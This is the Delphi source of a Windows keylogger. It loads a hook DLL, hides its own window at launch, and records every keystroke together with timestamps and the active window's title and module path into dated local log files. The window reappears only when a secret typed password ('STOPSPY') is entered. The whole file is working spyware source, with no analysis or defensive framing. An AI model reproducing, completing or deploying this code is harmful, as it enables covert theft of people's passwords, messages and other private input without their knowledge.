program KeyLogger;

uses
  Messages, Windows;

{$R KeyLogger.res}

const
  IconName='MAINICON';
  KeyEvent=WM_USER+1;
  MouseEvent=KeyEvent+1;
  WinTitle='TKeyForm';
  BuffSize=500;
  Password='STOPSPY';
  Starting='START HOOK';
  Continue='CONTINUE SPY';
  Ending='END HOOK';
  DllName='SniffDll.dll';
  WinActTxt='Window Activated - ''';

type
  LongRec = packed record
    Lo, Hi: Word;
end;

var
  Handle, Button, CWnd, LastWnd: HWND;
  WinClass: TWndClass;
  HLib: THandle;
  Time: SystemTime;
  Minute: word;
  Msg: TMsg;
  FileName: string;
  Cr: array[0..1] of char;
  Buffer: array[0..1000] of char;
  SzKeyName, WindowName: array[0..100] of char;
  SnifF: boolean;
  bPassword: string[Length(Password)];
  AfterCrush: boolean=false;

function SetKeyHook: Longint; external DllName name 'SetKeyHook';
function DelKeyHook: Longint; external DllName name 'DelKeyHook';

procedure HideAsk;
begin
  ShowWindow(Handle, SW_HIDE);
end;

procedure ShowAsk;
begin
  ShowWindow(Handle, SW_SHOW);
end;

procedure RegisterMySelf;
begin
end;

function FileAge(const FileName: string): Integer;
var
  Handle: THandle;
  FindData: TWin32FindData;
  LocalFileTime: TFileTime;
begin
  Handle:=FindFirstFile(PChar(FileName), FindData);
  if Handle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(Handle);
    if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
    begin
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
        LongRec(Result).Lo) then Exit;
    end;
  end;
  Result:=-1;
end;


function FileExists(const FileName: string): Boolean;
begin
  Result:=FileAge(FileName) <> -1;
end;

function StrLen(const Str: PChar): Cardinal; assembler;
asm
  mov edx, edi
  mov edi, eax
  mov ecx, 0FFFFFFFFh
  xor al, al
  repne scasb
  mov eax, 0FFFFFFFEh
  sub eax, ecx
  mov edi, edx
end;

function StrCopy(Dest: PChar; const Source: PChar): PChar; assembler;
asm
  push edi
  push esi
  mov esi, eax
  mov edi, edx
  mov ecx, 0FFFFFFFFh
  xor al, al
  repne scasb
  not ecx
  mov edi, esi
  mov esi, edx
  mov edx, ecx
  mov eax, edi
  shr ecx, 2
  rep movsd
  mov ecx, edx
  and ecx, 3
  rep movsb
  pop esi
  pop edi
end;

function StrEnd(const Str: PChar): PChar; assembler;
asm
  mov edx, edi
  mov edi, eax
  mov ecx, 0FFFFFFFFh
  xor al, al
  repne scasb
  lea eax, [edi-1]
  mov edi, edx
end;

function StrCat(Dest: PChar; const Source: PChar): PChar;
begin
  StrCopy(StrEnd(Dest), Source);
  Result := Dest;
end;

function IntToStr(x: integer): string;
begin
  Str(x, Result);
end;


procedure GenerateFileName;
var
  ST: SystemTime;
begin
  GetLocalTime(ST);
  FileName:=IntToStr(ST.wDay)+'day_'+IntToStr(ST.wMonth)+'month.log';
  if FileExists(FileName) then
    AfterCrush:=true;
end;

procedure EmptyBuffer;
var
  F: File;
begin
  GenerateFileName;
  AssignFile(F, FileName);
  if FileExists(FileName) then
    begin
      Reset(F, 1);
      Seek(F, FileSize(F));
    end
  else
    Rewrite(F, 1);
  BlockWrite(F, Buffer, StrLen(Buffer));
  CloseFile(F);
  FillChar(Buffer, SizeOf(Buffer), chr(0));
end;

procedure SaveData(D: PChar);
begin
  if StrLen(Buffer) < BuffSize
    then
      StrCat(Buffer, D)
    else
      EmptyBuffer;
end;

procedure WriteTime;
var
  K: string[100];
  i: byte;
begin
  if Time.wMinute > 9
  then K:='Time : '''+IntToStr(Time.wHour)+':'+IntToStr(Time.wMinute)+''''
  else K:='Time : '''+IntToStr(Time.wHour)+':0'+IntToStr(Time.wMinute)+'''';
  for i:=1 to Length(K) do
    SzKeyName[i-1]:=K[i];
  SzKeyName[Length(K)]:=chr(0);
  SaveData(SzKeyName);
  FillChar(SzKeyName, SizeOf(SzKeyName), chr(0));
  SaveData(Cr);
end;

procedure CheckTime;
begin
  GetLocalTime(Time);
  if Time.wMinute<>Minute then
    begin
      Minute:=Time.wMinute;
      SaveData(Cr);
      WriteTime;
    end;
end;

procedure CheckTask;
begin
  CWnd:=GetForegroundWindow;
  GetWindowText(CWnd, SzKeyName, SizeOf(SzKeyName));
  if (CWnd <> LastWnd) or (SzKeyName <> WINDOWNAME) then
    begin
      LastWnd:=CWnd;
      WindowName:=SzKeyName;
      GetWindowModuleFileName(CWnd, SzKeyName, SizeOf(SzKeyName));
      if (StrLen(WindowName) <> 0) and (StrLen(SzKeyName) <> 0) then
        begin
          SaveData(Cr);
          SaveData(WinActTxt);
          SaveData(WindowName);
          SaveData(''' in Module : ''');
          SaveData(SzKeyName);
          SaveData(''';');
        end
      else
        if (StrLen(WindowName) = 0) and (StrLen(SzKeyName) <> 0) then
          begin
            SaveData(Cr);
            SaveData(WinActTxt);
            SaveData('Can not detect');
            SaveData(''' in Module : ''');
            SaveData(SzKeyName);
            SaveData(''';');
          end
        else
          begin
            SaveData(Cr);
            SaveData(WinActTxt);
            SaveData(WindowName);
            SaveData(''' in Module : ');
            SaveData('Can not detect');
            SaveData(''';');
          end;
      SaveData(Cr);
      CheckTime;
    end;
  FillChar(SzKeyName, SizeOf(SzKeyName), chr(0));
end;

procedure StartSniff;
begin
  Minute:=100;
  Sniff:=true;
  hLib:=LoadLibrary(DllName);
  SetKeyHook;
  Buffer[0]:=chr(0);
  LastWND:=0;
  WindowName:='';
  CheckTask;
  GenerateFileName;
  FillChar(Buffer, SizeOf(Buffer), chr(0));
  SaveData(Cr);
  if AfterCrush then
    SaveData(Continue)
  else
    SaveData(Starting);
  GetLocalTime(Time);
  Minute:=Time.wMinute;
  WriteTime;
  FillChar(SzKeyName, 100, chr(0));
  bPassword:='';
end;

procedure EndSniff;
begin
  Sniff:=false;
  Minute:=100;
  SaveData(Cr);
  GetLocalTime(Time);
  Minute:=Time.wMinute;
  SaveData(ENDING);
  WriteTime;
  FreeLibrary(hLib);
  DelKeyHook;
  EmptyBuffer;
end;

procedure CheckPassWord(b: Char);
var
  i: byte;
begin
  bPassword:=bPassword + b;
  for i:=1 to Length(bPassword) do
    if bPassword[i] <> Password[i] then
      begin
        bPassword:='';
        break;
      end;
  if Length(bPassword) = Length(Password) then
    ShowAsk;
end;

function WndProc(hnd, wmsg, wparam, lparam: integer): integer; stdcall;
var
  t: string;
begin
  case wmsg of
    WM_COMMAND:
      begin
        if dword(lparam) = button then
          begin
            if Sniff then
              begin
                T:='Start Spy';
                SendMessage(Button, WM_SETTEXT, 0, integer(T));
                EndSniff;
              end
            else
              begin
                T:='Stop Spy';
                SendMessage(Button, WM_SETTEXT, 0, integer(T));
                HideAsk;
                StartSniff;
              end;
          end;
      end;
    KeyEvent:
      begin
        GetKeyNameText(lParam, SzKeyName, SizeOf(SzKeyName));
        CheckPassword(chr(wParam));
        SaveData('<');
        SaveData(SzKeyName);
        FillChar(SzKeyName, 100, chr(0));
        SaveData('>');
      end;
    MouseEvent:
      CheckTASK;
    WM_DESTROY:
      begin
        EndSniff;
        EmptyBuffer;
        PostQuitMessage(0);
      end;
    else
      Result:=DefWindowProc(hnd, wmsg, wparam, lparam);
    end;
end;

Procedure CreateMySelf;
var
  T: string;
begin
  with WinClass do
    begin
      lpszClassName:=WinTitle;
      lpfnWndProc:=@WndProc;
      cbClsExtra:=0;
      cbWndExtra:=0;
      hInstance:=hInstance;
      style:=CS_HREDRAW+CS_VREDRAW+CS_DBLCLKS;
      hIcon:=LoadIcon(hInstance, IconName);
      hCursor:=LoadCursor(hInstance, IDC_ARROW);
      hbrBackground:=COLOR_WINDOW;
    end;
  RegisterClass(WinClass);
  Handle:=CreateWindowEx(WS_EX_WINDOWEDGE, WinTitle, 'Key Logger', WS_VISIBLE or WS_MINIMIZEBOX or WS_CAPTION or WS_SYSMENU, integer(CW_USEDEFAULT), integer(CW_USEDEFAULT), 170, 63, 0, 0, hInstance, nil);
  Button:=CreateWindowEx(BS_RIGHTBUTTON, 'BUTTON', 'Hook', (WS_TABSTOP or WS_VISIBLE or WS_CHILD), 5, 5, 96, 25, Handle, 0, hInstance, nil);
  T:='Stop Spy';
  SendMessage(Button, WM_SETTEXT, 0, integer(T));
end;

begin
  CreateMySelf;
  RegisterMySelf;
  Cr:=chr(13)+chr(10);
  FindWindow(WinTitle, nil);
  Sniff:=false;
  StartSniff;
  HideAsk;
  while GetMessage(Msg, 0, 0, 0) do
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
end.
